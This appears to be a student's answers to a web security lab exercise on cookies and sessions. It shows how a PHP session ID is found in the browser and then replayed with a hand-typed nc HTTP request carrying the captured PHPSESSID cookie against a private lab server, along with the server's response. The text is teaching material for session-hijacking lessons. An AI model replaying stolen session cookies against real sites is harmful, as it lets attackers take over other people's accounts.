@@ -1,0 +1,52 @@
+COOKIES and SESSIONS Exercises
+1) In the browser, visit <a href=http://192.168.10.100/webTutorial/count.php>count.php</a>
+   and then find the session ID your browser was given.
+   Describe how you found this and state what the session ID was.
+
+   When loading the count.php page. A session is created and stored in by default /var/lib/php5.
+   If you go to developer tools on the browser and go to storage and under cookies tab, you can 
+   see the session name and session ID. Sessions in php5/ will have the format sess_{SESSION_VALUE}.
+   By looking at the session value in the browser, you can see which session is the one active.
+       
+
+2) In Kali, on the command line, using nc, write up a request to use the session
+   you pulled above, send it to the server and get a response. You have effectively
+   stolen the browsers session. Submit the transcript of your nc session like mine below.
+
+root@ubuntu804Server:/var/lib/php5# nc 192.168.10.100 80                      
+GET /webTutorial/count.php HTTP/1.0
+Cookie: PHPSESSID=17a0fddd48fa10a077692ad76c75312a;
+
+HTTP/1.1 200 OK
+Date: Tue, 20 Oct 2020 02:25:52 GMT
+Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.7 with Suhosin-Patch
+X-Powered-By: PHP/5.2.4-2ubuntu5.7
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 171
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html lang="en">
+        <head>
+                <meta charset="utf-8">
+                <title>Count</title>
+        </head>
+        <body>
+                <h1>Count</h1>
+                You have been here 14 times.
+        </body>
+</html>
+
+
+3) In Kali, on the browser, visit
+   http://192.168.10.100/webTutorial/count.php
+   From the browsers point of view, what happened?
+
+   After running the nc command and hijacking the cookie, the count number went up.
+   The browser then thinks the user has been on the site THAT many times even though
+   he really hasn't. Therefore by hijacking the cookie, we can make the browser think
+   what we want it to think and manipulate data as such.
+
